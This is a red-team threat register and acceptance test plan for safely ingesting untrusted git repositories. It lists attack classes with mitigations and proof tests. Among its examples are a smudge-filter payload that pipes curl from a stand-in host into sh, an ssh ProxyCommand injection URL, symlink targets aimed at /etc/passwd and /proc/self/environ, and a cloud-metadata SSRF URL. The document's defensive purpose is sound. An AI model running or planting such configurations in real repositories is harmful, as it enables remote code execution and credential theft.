# Git Ingestion Threat Register + Acceptance Gauntlet

**Lane:** git-ingestion | **Worker:** 4 of 4 (Adversarial / Red Team)
**Date:** 2026-09-23
**Status:** THREAT DESIGN ONLY. No implementation here.
**Mission:** PING will ingest git repositories as first-class observations. Untrusted
repo content is HOSTILE INPUT. This document enumerates the attacks, the required
mitigations, and the proof tests the implementation must pass BEFORE git ingestion is
wired into any live acquisition path.

**Non-negotiable invariant:** the ingestion pipeline PARSES git object data. It NEVER
executes repository content, NEVER checks out untrusted repos into shared worktrees,
and NEVER follows repo-local configuration.

---

## 1. THREAT REGISTER

### T-01: Path traversal via malicious tree entries

**ATTACK:** A git tree object stores entries as `<mode> <name>\0<sha>`. The name is
NUL-terminated, so NUL bytes are structurally impossible, but a crafted tree CAN
contain entry names with `/` (full pathnames), `.`, `..`, `.git`, or empty names.
Attackers craft such trees with low-level plumbing (`git hash-object -t tree -w`,
`git mktree`, or a raw object writer) and push them to a repo that PING ingests.
If PING's object parser or any materialization step joins those names into paths
naively (`os.path.join(root, name)`), writes land outside the intended root. Git
itself treats these as corrupt: `git fsck` reports `FSCK_MSG_FULL_PATHNAME`,
`FSCK_MSG_HAS_DOT`, `FSCK_MSG_HAS_DOTDOT`, `FSCK_MSG_HAS_DOTGIT`, and `FSCK_MSG_EMPTY_NAME`,
and git's checkout path (`unpack_trees` / `verify_path`) refuses them with
"error: invalid path". So git's OWN parser rejects them; only a naive
re-implementation of tree parsing is vulnerable. That is exactly the risk: PING's
custom ingestion parser is the naive re-implementation.

**IMPACT if unmitigated:** Arbitrary file write/read outside the ingestion sandbox
by the ingestion service account; config overwrite, credential theft, or implanting
code that a later stage executes.

**REQUIRED MITIGATION:**
- Every tree entry name is validated before any path use, with the same gates as
  `git fsck`: reject empty names, `.`, `..`, `.git` components, names containing
  `/`, and names longer than a sane cap (e.g., 255 bytes per component,
  4096 bytes full path).
- Ingestion works on object SHAs and in-memory structures, never by materializing
  entry names onto disk. If materialization is ever needed, it happens under a
  dedicated per-ingest scratch dir that is deleted afterwards, with the validated
  path re-checked after canonicalization (defense in depth: `realpath` containment).
- Unicode/whitespace camouflage (trailing spaces, RTL overrides) is normalized or
  flagged before display (also see T-11).

**PROOF TEST:** Ingest a fixture repo whose tree contains entries named `..`,
`../../etc/cron.d/x`, `a/b` (full pathname), `.`, `.git`, and empty name. Assert
the ingestion packet marks the repo `QUARANTINED:malformed-tree`, emits zero path
strings containing `..` or `/` components into downstream observations, and that no
file is created outside the scratch root (assert via pre/post directory snapshot
diff).

---

### T-02: Submodule bombs / recursive submodule ingestion

**ATTACK:** A gitlink (mode `160000`) is an opaque 20/32-byte SHA plus a `.gitmodules`
entry with an attacker-controlled URL. A repo can contain thousands of gitlinks, each
pointing to another repo that contains thousands more. If ingestion follows
submodules (clones/fetches each URL, recurses), an attacker gets exponential fan-out:
a billion-laughs shape where a few KB of commits trigger unbounded network fetches,
disk use, and CPU. Submodule URLs have a real RCE history: CVE-2018-11235 (crafted
`.gitmodules` with `../` in submodule names + post-checkout hooks from the embedded
submodule repo executing on recursive clone) and CVE-2025-48384 (submodule config
quoting RCE, fixed in git 2.50.1) both fire through recursive submodule handling.

**IMPACT if unmitigated:** DoS of the ingestion fleet via fetch amplification;
worst case, RCE if any stage of the pipeline performs submodule checkout with a
vulnerable git or honors hooks.

**REQUIRED MITIGATION:**
- Gitlinks are TERMINAL opaque entries. Ingestion NEVER clones, fetches, or
  recurses into submodule URLs. Record `{path, sha, url-from-.gitmodules}` as
  metadata only.
- `.gitmodules` is parsed as data, never executed: submodule URLs are never used as
  fetch targets, never passed to ssh, never written into any git config.
- Hard cap: max gitlinks per tree and per packet (e.g., 1,000); exceeding the cap
  quarantines the repo instead of expanding work.
- No `--recurse-submodules` anywhere in the pipeline's git invocations, ever. A
  static lint test asserts the flag string appears nowhere in the codebase.

**PROOF TEST:** Ingest a fixture repo with 5,000 gitlinks whose `.gitmodules` URLs
point at `file:///dev/null`, `ssh://-oProxyCommand=...`, and internal RFC1918 HTTP
hosts. Assert: zero outbound connections attempted (assert via network namespace /
egress log), ingestion completes within the packet timeout, and the packet contains
only opaque gitlink metadata records.

---

### T-03: Huge blobs / pack bombs

**ATTACK:** Git objects compress with zlib; deltas chain. A pack file of a few MB can
expand to many GB: extreme delta chains (a delta based on a delta based on a delta,
thousands deep) force CPU/memory blowup during reconstruction, and a single blob's
declared size can be enormous while its compressed size is tiny. Git's own
protections are limited: `core.bigFileThreshold` (default 512 MiB) only changes
delta strategy, and git streams objects but still allocates by declared size in
several paths. A naive ingestion reader that does `readObject(sha)` into memory or
that decompresses a pack without a cumulative cap will OOM or fill the disk. There
is no hard cap on pack expansion ratio in git itself.

**IMPACT if unmitigated:** Memory exhaustion and disk exhaustion on ingestion hosts;
cascade DoS across the pipeline; potential host kill by OOM.

**REQUIRED MITIGATION:**
- Streaming decompression with TWO caps enforced during the stream, before any byte
  is buffered: (a) per-blob decompressed cap (e.g., 64 MiB; larger blobs recorded
  as `blob-truncated` metadata with sha + size, content not ingested), and
  (b) cumulative per-packet decompressed cap (e.g., 1 GiB).
- Pack expansion ratio tripwire: if `decompressed_bytes / compressed_bytes`
  exceeds a ratio (e.g., 100:1) for a single object or pack section, abort the
  object and quarantine the repo (`QUARANTINED:pack-bomb-suspect`).
- Delta chain depth cap (e.g., 64); deeper chains are rejected without resolution.
- Never allocate by declared size up front; grow buffers in bounded chunks.
- All caps are constants in one config module with per-environment overrides, and
  every cap breach emits a typed event, not a silent skip.

**PROOF TEST:** (a) Ingest a fixture pack containing a 10 MB blob that is 99.99%
zeros (expands to >1 GiB). Assert ingestion aborts the blob at the per-blob cap,
memory high-water stays under a fixed bound (measured in the test harness), and the
packet records `blob-truncated`. (b) Ingest a fixture with a 2,000-deep delta
chain. Assert the chain is rejected at the depth cap without full resolution.

---

### T-04: Binary smuggling: executables, polyglots, malicious content in blobs

**ATTACK:** A blob can be anything: an ELF binary, a script with a shebang, a
polyglot (valid as both image and JS, or zip+script), a malicious Office macro
document, or a payload designed to exploit a downstream consumer (a thumbnailer,
an embedding model, a code indexer, a markdown renderer). Ingestion that hands blob
bytes to any tool that interprets them (image processors, archive extractors,
language runtimes, "smart" preview generators) turns a passive read into execution.

**IMPACT if unmitigated:** RCE or sandbox escape in downstream tooling; malicious
content rendered to operators (Mission Control) or end users; poisoned embeddings
or indexes.

**REQUIRED MITIGATION:**
- Ingestion NEVER executes blob content and NEVER passes blob bytes to interpreters,
  archive extractors, image/video processors, or build tools. Content extraction is
  limited to: text decoding (with a strict charset allowlist and a max decode
  budget), magic-byte type identification, and cryptographic hashing.
- Binary vs text decision by content sniffing, not extension; binaries are stored
  as `{sha, size, magic-type}` metadata only.
- Polyglot-aware rule: a blob that sniffs as multiple dangerous types is labeled
  `polyglot-suspect` and quarantined from rendering paths.
- Any downstream consumer that wants to render or execute blob-derived content must
  re-validate through its own sandbox; ingestion marks every derived artifact with
  `provenance: untrusted-repo-content`.
- Extension allowlists for any future rendering feature; default-deny.

**PROOF TEST:** Ingest a fixture repo containing: an ELF binary named `README.md`,
a polyglot GIF/JS file, a zip bomb nested as a blob, and a Python script with a
shebang. Assert: no subprocess is spawned during ingestion (assert via syscall /
process-spawn audit), every blob is classified by sniffed type (not extension),
the ELF and polyglot are recorded as metadata-only, and the packet carries
`provenance: untrusted-repo-content` on all derived artifacts.

---

### T-05: Author/committer spoofing

**ATTACK:** `author` and `committer` name/email fields in a commit object are
free text, settable by `GIT_AUTHOR_NAME`, `GIT_COMMITTER_EMAIL`, or a raw commit
writer. Anyone can commit as `nolan@pingsocial.com`, `root@localhost`, or any
real person's identity. There is zero authentication bound to these fields.

**IMPACT if unmitigated:** PING attributes observations, code changes, or "who did
what" intelligence to the wrong person; social-engineering downstream (e.g., "the
CEO committed this, it must be safe"); poisoned attribution in analytics.

**REQUIRED MITIGATION:**
- PING treats author/committer as UNVERIFIED CLAIMS, never as identity. The data
  model must carry them in a field literally named `claimed_author` /
  `claimed_committer` (or equivalent) so no downstream consumer can mistake them
  for authenticated identity.
- Identity-grade attribution requires a verified signature (T-06) against a pinned
  trust anchor, and even then is recorded as `verified_signer`, separate from the
  claimed author.
- Any UI or report rendering these fields labels them "unverified" unless signature
  verification passed.

**PROOF TEST:** Ingest a fixture repo with commits claiming author
`Nolan Geske <nolan@pingsocial.com>` (a name the attacker does not own). Assert the
observation stores the name only under `claimed_author`, no identity-linking event
fires, and any rendered view shows an "unverified" marker.

---

### T-06: Commit signature forgery / signature stripping

**ATTACK:** A commit signature (GPG/SSH/X.509 `gpgsig` header) covers the commit
content. Attacker options: (a) sign with their own key while spoofing someone
else's author field (T-05) — the signature is VALID but proves nothing about the
claimed author; (b) strip the signature — but stripping changes the commit bytes,
hence the hash, so a stripped commit is a DIFFERENT commit and is detectable by
hash mismatch against any pinned/expected hash; (c) signature malleation — recent
research (reported 2026) showed GitHub's verifier accepted non-canonical OpenPGP
packets, letting one logical signed commit exist under multiple hashes while
keeping a "Verified" badge, breaking hash-pinned trust assumptions.

**IMPACT if unmitigated:** False trust: PING treats attacker content as
"verified"; hash-pinned dependencies or allowlists silently bypassed by malleated
duplicates.

**REQUIRED MITIGATION:**
- Verification is only meaningful against an explicit trust anchor: a pinned
  keyring / `allowedSignersFile`-style mapping of key -> identity, managed by PING,
  never derived from the repo itself.
- Record the full verification outcome as structured data: `signature_present`,
  `signature_valid`, `signer_key_id`, `signer_trusted` (key in pinned set), and
  NEVER collapse this into a single "verified" boolean. A valid signature from an
  untrusted key is `signature_valid=true, signer_trusted=false`.
- Signature presence/validity is orthogonal to author identity (T-05): a commit can
  be validly signed by key K while claiming author A; the observation must show
  both facts, not merge them.
- Malleation defense: canonicalize or hash-normalize signature envelopes before
  deriving identity signals; treat same-content/different-hash commits as distinct
  objects and never deduplicate trust by content alone.

**PROOF TEST:** Fixture repo with four commits: (1) unsigned, (2) signed with a key
in the pinned trust set, (3) validly signed with an attacker's key while claiming
the victim's author name, (4) a malleated duplicate of (2) with non-canonical
signature packets (different hash, same content). Assert the packet reports:
(1) `signature_present=false`; (2) `valid=true, trusted=true`;
(3) `valid=true, trusted=false` with `claimed_author` still marked unverified;
(4) recorded as a distinct commit hash with its own verification record, not
merged with (2).

---

### T-07: History rewriting mid-ingest (force-push TOCTOU)

**ATTACK:** Ingestion resolves a ref (e.g., `refs/heads/main` -> sha X), then walks
objects. Between the ref read and the object walk, the repo owner force-pushes:
the ref now points to sha Y with different history. The ingestion packet silently
mixes metadata from ref-at-time-T0 with objects from time-T1, or walks objects
that are no longer reachable (and may have been crafted as a trap: e.g., objects
that exist only in the brief window). For a hosted source, the window is real;
for a local mirror being concurrently updated, it is routine.

**IMPACT if unmitigated:** Inconsistent observations (ref says v2.1, content is
v2.0 or attacker-swapped); TOCTOU-based confusion attacks; non-reproducible
packets that fail audit.

**REQUIRED MITIGATION:**
- Snapshot protocol: at packet start, atomically record `{refname: sha}` for every
  ref the packet will walk (single `git for-each-ref` / `show-ref` read, or a
  transaction-guarded read of `packed-refs` + loose refs).
- Walk objects BY OID from the snapshot, never by re-resolving ref names mid-walk.
- At packet end, re-read the refs and compare. If any walked ref moved, mark the
  packet `STALE:ref-moved-during-ingest` and either discard or re-queue; never
  silently emit a mixed packet.
- Packets carry `ref_snapshot` + `ref_snapshot_end` so any consumer can detect the
  race independently.

**PROOF TEST:** Harness ingests a fixture repo while a background process
force-pushes `main` to a different commit every 200 ms. Assert every emitted packet
is either internally consistent (all objects reachable from the snapshot SHAs) or
marked `STALE`; assert zero packets contain objects from post-snapshot history
mixed with pre-snapshot ref metadata.

---

### T-08: Symlink escape in checked-out trees

**ATTACK:** Tree entries with mode `120000` are symlinks; the blob content is the
link target, attacker-controlled (e.g., `../../../../etc/passwd`,
`/proc/self/environ`). If ingestion materializes a worktree, or if any content
extraction follows symlinks (reading "the file at path P" through the link), it
reads or writes outside the repo root. Real precedent: CVE-2025-26625 / GHSA-6pvw-g552-53c5
— git-lfs checkout followed crafted symlinks/hardlinks and wrote LFS payloads to
files outside the working tree (patched in git-lfs 3.7.1). The same class bites any
ingestion step that resolves paths through untrusted trees.

**IMPACT if unmitigated:** Arbitrary file read (secrets, keys, `/proc`) or write
outside the ingestion root by the service account.

**REQUIRED MITIGATION:**
- Ingestion NEVER materializes untrusted trees to disk (reinforces the global
  rule). All tree walking is in-memory on object data.
- Symlinks are recorded as data: `{path, target}` with the target length capped
  (e.g., 4 KiB); the target is NEVER resolved, followed, or used as a filesystem
  path by any pipeline stage.
- If a future feature ever needs on-disk materialization, it must use a hardened
  extractor (no symlink following, `O_NOFOLLOW` semantics, post-write containment
  check) — but that feature does not exist in the ingestion lane and needs its own
  threat review.
- Defense in depth: the ingestion process runs with no ability to read sensitive
  host paths (drop privileges, read-only root FS where possible).

**PROOF TEST:** Ingest a fixture repo containing symlinks pointing at
`../../../../etc/passwd`, `/proc/self/environ`, and an absolute path to the
harness's own secret file. Assert: no read of any target occurs (assert via
filesystem-access audit / strace allowlist), the packet records only
`{path, target}` metadata, and the secret file's atime is unchanged.

---

### T-09: .gitattributes / .gitconfig smuggling (checkout-time code execution)

**ATTACK:** `.gitattributes` can declare `filter=`, `diff=`, and `merge=` drivers;
those drivers are defined in git CONFIG (`filter.<name>.clean/smudge`,
`diff.<name>.command`) — and a repo can ship a `.gitconfig` (via `include.path`)
or rely on the operator cloning with config that honors repo content. On checkout,
git EXECUTES smudge filters and diff drivers as shell commands. Classic payload:
`.gitattributes` containing `*.dat filter=pwn` plus repo config defining
`filter.pwn.smudge=curl evil.sh|sh`. Any pipeline step that checks out, diffs with
external drivers, or loads repo-local git config can trigger execution. Note git
deliberately does NOT transfer `.git/config` on clone/fetch — the attack needs a
checkout or config-loading step to fire, which is exactly what ingestion must never
provide.

**IMPACT if unmitigated:** Remote code execution as the ingestion service account
the moment a malicious repo is ingested.

**REQUIRED MITIGATION:**
- Ingestion NEVER runs `checkout`, `clone` (of untrusted content into a worktree),
  `diff` with external drivers, or any command that honors smudge/clean filters.
- Repo-local config is NEVER loaded into the process: all git invocations use an
  explicit minimal config (`-c` flags or `GIT_CONFIG_GLOBAL=/dev/null`-style
  isolation); `include.path`, `core.fsmonitor`, `core.sshCommand`, and any
  `filter.*`/`diff.*` settings from the repo are ignored by construction.
- `.gitattributes` and `.gitmodules` and `.gitconfig`-shaped files are parsed as
  plain data for observation purposes only.
- Static lint test: the ingestion codebase contains no invocation of
  `git checkout`, `git clone` (untrusted source), or `git diff` with external
  driver flags.

**PROOF TEST:** Ingest a fixture repo containing `.gitattributes` with
`*.bin filter=evil`, a `.gitconfig` defining `filter.evil.smudge=<curl-payload>`,
and `.git/hooks/post-checkout` with a payload. Assert: zero subprocess executions
during ingestion (process-spawn audit), hooks directory never read as code, and
the packet contains the `.gitattributes` content only as a text observation flagged
`config-smuggling-pattern`.

---

### T-10: LFS pointer abuse (size lies + fetch-as-SSRF/exfil)

**ATTACK:** An LFS pointer file is tiny text:
`version https://git-lfs.github.com/spec/v1\noid sha256:...\nsize 123456789\n`.
The `size` field is attacker-controlled and can claim petabytes; any ingestion step
that pre-allocates or fetches by declared size is DoSable. Worse, resolving the
pointer means an LFS batch API call to a URL derived from the repo's remote config
(`.lfsconfig` supports `lfs.url`, and CVE-2017-17831 showed ssh URLs with leading
dashes in `lfs.url` yielding command execution in old git-lfs). If ingestion
fetches LFS objects, the attacker controls the destination host: SSRF against
internal metadata endpoints (cloud IMDS), internal services, plus exfiltration of
any credentials the fetcher attaches (auth headers sent to attacker host). Pointer
files can also simply not match any real object (dangling), which must not hang
the pipeline on retries.

**IMPACT if unmitigated:** SSRF to internal network, credential exfiltration via
auth headers, DoS via petabyte size claims, pipeline hangs on dangling pointers.

**REQUIRED MITIGATION:**
- Ingestion NEVER fetches LFS object content. Pointer files are terminal metadata:
  record `{oid, declared_size, version}` only.
- Declared `size` is sanity-capped: pointers claiming absurd sizes (e.g.,
  > 1 TiB, or size inconsistent with any plausible repo) are flagged
  `lfs-pointer-suspect`, never pre-allocated, never used for buffer sizing.
- `.lfsconfig` URLs are never honored as fetch targets; they are recorded as data.
- If a future stage needs LFS content, it goes through a dedicated, allowlisted,
  credential-less fetcher with SSRF egress filtering — out of scope for ingestion
  and requiring its own threat review.

**PROOF TEST:** Ingest a fixture repo with pointer files claiming
`size 999999999999999`, a `.lfsconfig` with `lfs.url = http://169.254.169.254/`,
and dangling pointers. Assert: zero outbound HTTP requests (egress log), no
allocation by declared size (memory high-water bound), ingestion completes within
timeout, and pointers are recorded as metadata with `lfs-pointer-suspect` flags
where applicable.

---

### T-11: Commit message / metadata injection (log forgery, terminal escapes)

**ATTACK:** Commit messages, tag messages, author names, and ref names are
attacker-controlled bytes. They can contain: ANSI escape sequences
(`\x1b[2J`, `\x1b]0;`, hyperlinks `\x1b]8;;`) that rewrite operator terminals or
Mission Control log views; newlines + fake log prefixes (`[INFO]`, timestamps)
that forge log lines in line-oriented log pipelines; RTL override characters
(U+202E) that visually reorder displayed filenames; and control characters that
break JSON/CSV consumers or terminal emulators.

**IMPACT if unmitigated:** Log forgery (fake "ingestion succeeded" lines),
terminal manipulation on operator machines, misleading displays in Mission
Control, downstream parser breakage.

**REQUIRED MITIGATION:**
- All repo-controlled strings are sanitized at the ingestion boundary: strip C0/C1
  control characters (except `\n`, `\t` where explicitly allowed), neutralize ANSI
  escapes, and apply Unicode bidi isolation (U+2066..U+2069) or visible
  replacement for bidi overrides when rendering.
- Structured output only: observations are emitted as typed records, never as
  free-text log lines that a downstream grep would trust. Multi-line fields are
  length-capped (e.g., 10 KiB per message field; excess truncated with a marker).
- Any human-facing rendering escapes or encodes these fields; raw bytes are
  available only in a hex/escaped inspector view.

**PROOF TEST:** Ingest a fixture repo whose commit messages contain ANSI
clear-screen + fake `[INFO] INGEST OK` lines, a U+202E filename reversal, and a
2 MB single-line message. Assert: the packet's structured fields contain no raw
ESC bytes, no forged log line survives into the pipeline log stream (assert by
scanning emitted logs for the forged prefix outside its field context), the
message is truncated at the cap with a truncation marker, and the bidi filename
renders with isolation markers.

---

### T-12: Ref namespace confusion

**ATTACK:** `refs/heads/x` and `refs/tags/x` are different namespaces, but
confusion arises at the edges: case-insensitive filesystems collapse
`refs/heads/Feature` and `refs/heads/feature` into one loose-ref file (one
silently wins); `packed-refs` vs loose refs can disagree; symbolic refs
(`HEAD`, or `refs/heads/a` -> `refs/heads/b`) can create aliasing or cycles;
and adversarial ref names can collide after case folding or Unicode
normalization on macOS/Windows checkouts. An ingestion walk that treats ref
names as opaque-but-distinct keys can double-count, misattribute, or follow a
symref cycle forever.

**IMPACT if unmitigated:** Duplicate or misattributed observations; infinite loop
on symref cycles; wrong "default branch" / "latest tag" conclusions feeding
downstream decisions.

**REQUIRED MITIGATION:**
- Validate every ref name with `git check-ref-format` rules before use; reject
  anything invalid.
- Resolve symbolic refs with a hop cap (e.g., 5); cycles or over-long chains
  quarantine the repo.
- On case-insensitive filesystems, detect case-fold collisions between loose refs
  and between loose refs and `packed-refs`, and record the collision explicitly
  rather than letting one silently shadow the other.
- Canonical rule: one ref name -> one recorded ref; `HEAD`'s target is recorded
  separately as `head_target`, never merged into branch identity.

**PROOF TEST:** Fixture repo with `refs/heads/Feature` and `refs/heads/feature`
loose refs pointing at different commits, a symref cycle (`refs/heads/a` ->
`refs/heads/b` -> `refs/heads/a`), and an invalid ref name. Assert: the cycle is
cut at the hop cap with `ref-cycle-detected`, the case collision is reported (not
silently resolved), the invalid ref is dropped, and each surviving ref maps to
exactly one SHA in the packet.

---

## 2. GLOBAL INGESTION BOUNDARIES

These are non-negotiable resource and behavior caps. They live in ONE config
module, are enforced at the point of use (not just documented), and every breach
emits a typed event.

| Boundary | Cap | Rationale |
|---|---|---|
| Max blob size (ingested content) | 64 MiB per blob | Larger blobs -> `blob-truncated` metadata only (T-03) |
| Max pack expansion ratio | 100:1 per object; abort object above | Pack-bomb tripwire (T-03) |
| Cumulative decompressed bytes per packet | 1 GiB | Fleet-wide DoS bound (T-03) |
| Max tree depth | 32 levels | Pathological nesting bound (T-01) |
| Max tree entries per tree | 100,000 | Entry-count bomb bound |
| Max gitlinks (submodules) per packet | 1,000, recorded opaque only | Submodule-bomb bound (T-02) |
| Max commits walked per packet | 10,000 | History-walk bound; older history via follow-up packets |
| Max refs processed per packet | 5,000 | Ref-spam bound (T-12) |
| Max single metadata field | 10 KiB (messages), 4 KiB (symlink targets) | Injection bound (T-08, T-11) |
| Per-packet wall-clock timeout | 120 s | Hang bound (T-10 dangling pointers, T-07 races) |
| Symref resolution hops | 5 | Cycle bound (T-12) |
| Delta chain depth | 64 | CPU bomb bound (T-03) |

**Behavioral invariants (hard rules, not caps):**
1. Ingestion NEVER executes repository content: no checkout, no hooks, no
   smudge/clean filters, no diff drivers, no submodule recursion, no LFS fetch,
   no build/test/lint of repo code. (T-02, T-04, T-09, T-10)
2. Ingestion NEVER checks out untrusted repos into shared worktrees. If any future
   stage needs a worktree, it uses a per-ingest disposable scratch dir under a
   dedicated mount with `noexec`, deleted afterwards — and that stage gets its own
   threat review. (T-01, T-08, T-09)
3. Repo-local configuration is NEVER loaded: `.gitconfig`, `.lfsconfig`,
   `.gitattributes` drivers, hooks, and `include.path` are data, not config.
   (T-09, T-10)
4. Identity fields are claims until proven: `claimed_*` naming is mandatory in the
   schema. (T-05, T-06)
5. Fail closed: any boundary breach quarantines the repo (`QUARANTINED:<reason>`)
   with a typed event. Silent skips are forbidden. (all)

---

## 3. ACCEPTANCE GAUNTLET

Every test below must pass before git ingestion is wired into any live
acquisition path. Each test ingests a crafted fixture repo through the REAL
ingestion pipeline (not a mock) and asserts the stated outcome.

- **G-01 (tree traversal):** Fixture with tree entries named `..`,
  `../../evil`, `a/b`, `.`, `.git`, empty name. Assert repo quarantined as
  `malformed-tree`, no `..`/absolute paths in any emitted observation, scratch
  root diff empty.
- **G-02 (submodule bomb):** 5,000 gitlinks with hostile `.gitmodules` URLs
  (`ssh://-oProxyCommand=`, RFC1918 HTTP, `file:///dev/null`). Assert zero egress,
  completion within timeout, gitlinks recorded as opaque metadata only.
- **G-03 (submodule RCE regression):** `.gitmodules` with `../` in submodule
  names + embedded submodule repo containing `hooks/post-checkout` payload
  (CVE-2018-11235 shape). Assert no hook executes, no path escapes
  `$GIT_DIR/modules`.
- **G-04 (pack bomb):** 10 MB highly-compressible blob (>1 GiB expanded).
  Assert per-blob cap aborts it, memory high-water under bound,
  `blob-truncated` recorded.
- **G-05 (delta chain bomb):** 2,000-deep delta chain. Assert rejection at depth
  cap without full resolution, within timeout.
- **G-06 (binary smuggling):** ELF named `README.md`, GIF/JS polyglot, zip bomb
  blob, shebang script. Assert zero subprocess spawns, type-by-sniffing
  classification, binaries metadata-only, `provenance: untrusted-repo-content`
  on all artifacts.
- **G-07 (author spoofing):** Commits claiming victim identities. Assert
  `claimed_author` only, no identity-linking events, "unverified" markers on
  render.
- **G-08 (signature semantics):** Four-commit fixture (unsigned / trusted-signed
  / attacker-signed-as-victim / malleated duplicate). Assert the exact
  `{present, valid, trusted}` matrix from T-06 and no trust-merge of the
  malleated duplicate.
- **G-09 (force-push race):** Background force-push every 200 ms during ingest.
  Assert every packet is internally consistent or marked `STALE`; zero mixed
  packets.
- **G-10 (symlink escape):** Symlinks to `../../../../etc/passwd`,
  `/proc/self/environ`, harness secret file. Assert no target read (fs audit),
  `{path, target}` metadata only, secret atime unchanged.
- **G-11 (config smuggling):** `.gitattributes` filter driver + `.gitconfig`
  smudge payload + `hooks/post-checkout`. Assert zero subprocess execution,
  attributes recorded as flagged text data only.
- **G-12 (LFS abuse):** Petabyte-claim pointer, `.lfsconfig` pointing at
  `http://169.254.169.254/`, dangling pointers. Assert zero egress, no
  declared-size allocation, completion within timeout, `lfs-pointer-suspect`
  flags.
- **G-13 (metadata injection):** ANSI escapes + forged `[INFO]` log lines +
  U+202E filename + 2 MB message. Assert no raw ESC in structured fields, no
  forged lines in pipeline logs, truncation marker present, bidi isolation on
  render.
- **G-14 (ref confusion):** Case-colliding loose refs, symref cycle, invalid ref
  name. Assert cycle cut at hop cap, collision explicitly reported, invalid ref
  dropped, 1:1 ref->SHA mapping.
- **G-15 (no-execution lint):** Static scan of the ingestion codebase asserts the
  absence of `checkout`, `--recurse-submodules`, external diff driver
  invocation, LFS fetch calls, and any `eval`/`exec` of repo-derived strings.
  Fails the build if any appear.
- **G-16 (cap enforcement):** Each row of the Global Boundaries table has a
  dedicated unit/integration test asserting the exact cap value is enforced at
  the point of use and emits the typed breach event. Caps are read from the
  single config module; a test asserts no hardcoded duplicates exist elsewhere.

---

## 4. HARD-GATE LIST

Ingestion MUST NOT be wired into the live acquisition pipeline until ALL of the
following hold. These are ordered by blast radius.

1. **Parse-only architecture proven (G-15 + G-06 + G-11):** no checkout, no
   hooks, no filters, no submodule recursion, no LFS fetch, no subprocess
   spawned by repo content. A single execution primitive reachable from
   untrusted bytes is RCE-as-a-service. This is the load-bearing wall.
2. **Submodule handling is terminal-opaque (G-02 + G-03):** gitlinks never
   trigger fetches. Recursive submodule handling has a real RCE history
   (CVE-2018-11235, CVE-2025-48384); "we will recurse carefully later" is not
   acceptable.
3. **Decompression caps enforced in-stream (G-04 + G-05 + G-16):** per-blob,
   cumulative, ratio, and delta-depth caps abort DURING the stream, before
   buffering. Post-hoc size checks do not stop an OOM.
4. **Symlink non-resolution (G-10):** symlink targets are data, never resolved.
   Combined with the no-checkout rule, this closes the arbitrary-read/write
   primitive (cf. CVE-2025-26625 in git-lfs).
5. **Repo-local config isolation (G-11 + G-15):** no repo config ever loaded
   into git invocations or the process. `.gitattributes`/`.gitconfig`/hooks are
   inert data.
6. **Ref snapshot + STALE protocol (G-09):** TOCTOU between ref read and object
   walk is closed; mixed packets are impossible by construction, not by luck.
7. **Identity schema discipline (G-07 + G-08):** `claimed_*` naming mandatory;
   signature outcomes recorded as `{present, valid, trusted}` against pinned
   anchors, never a single "verified" bit.
8. **Egress posture (G-02 + G-12):** the ingestion stage makes ZERO network
   requests derived from repo content (no submodule fetch, no LFS fetch).
   Egress allowlisting is verified in the gauntlet, not assumed.
9. **Metadata sanitization at the boundary (G-13):** ANSI/control/bidi
   neutralization before any log, UI, or downstream consumer sees repo strings.
10. **Quarantine-is-typed (G-01 + G-14 + G-16):** every boundary breach produces
    `QUARANTINED:<reason>` with a typed event. Silent drops are a finding, not
    a pass.

---

## Appendix: sources consulted (2026-09-23)

- git `fsck.c` tree validation flags (`FSCK_MSG_FULL_PATHNAME`, `HAS_DOT`,
  `HAS_DOTDOT`, `HAS_DOTGIT`, `EMPTY_NAME`) — github.com/git/git
- CVE-2018-11235: submodule `../` + post-checkout hook RCE via recursive clone
- CVE-2025-48384: submodule config quoting RCE (fixed git 2.50.1)
- CVE-2025-26625 / GHSA-6pvw-g552-53c5: git-lfs symlink/hardlink arbitrary file
  write (patched 3.7.1)
- CVE-2017-17831: git-lfs ssh URL leading-dash command execution via `.lfsconfig`
- CVE-2026-25921: Gogs LFS object overwrite (CWE-345, missing hash verification)
- 2026 research on commit-signature malleation vs GitHub "Verified" badge
  (non-canonical OpenPGP packets, hash-pinning bypass)
- CVE-2026-44471: gitoxide symlink path-traversal on checkout (illustrates why
  naive re-implementations of checkout/tree parsing are the vulnerable layer)
